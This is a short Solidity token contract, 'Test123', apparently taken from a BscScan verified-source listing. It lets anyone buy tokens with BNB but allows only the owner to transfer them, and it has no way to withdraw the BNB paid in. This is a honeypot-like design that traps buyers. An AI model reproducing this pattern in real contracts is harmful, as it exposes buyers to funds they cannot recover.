/**
 *Submitted for verification at BscScan.com on 2023-03-05
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Test123Token {
    string private _name;
    string private _symbol;
    uint256 private _totalSupply;
    uint8 private _decimals;
    address private _owner;
    mapping(address => uint256) private _balances;

    constructor() {
        _name = "Test123";
        _symbol = "T123";
        _totalSupply = 100000000000000000000000000000000000;
        _decimals = 18;
        _owner = msg.sender;
        _balances[msg.sender] = _totalSupply;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        require(msg.sender == _owner, "Only the contract owner can transfer tokens.");
        require(recipient != address(0), "Transfer to zero address is not allowed.");
        require(amount > 0, "Transfer amount must be greater than zero.");
        require(_balances[msg.sender] >= amount, "Not enough tokens to transfer.");

        _balances[msg.sender] -= amount;
        _balances[recipient] += amount;

        return true;
    }

    function buyTokens() public payable returns (bool) {
        require(msg.sender != address(0), "Buying tokens from zero address is not allowed.");
        require(msg.value > 0, "Buying token requires a non-zero amount of BNB.");

        uint256 amount = msg.value * 10 ** _decimals;

        require(_balances[_owner] >= amount, "Not enough tokens available for purchase.");

        _balances[_owner] -= amount;
        _balances[msg.sender] += amount;

        return true;
    }

    function getOwner() public view returns (address) {
        return _owner;
    }
}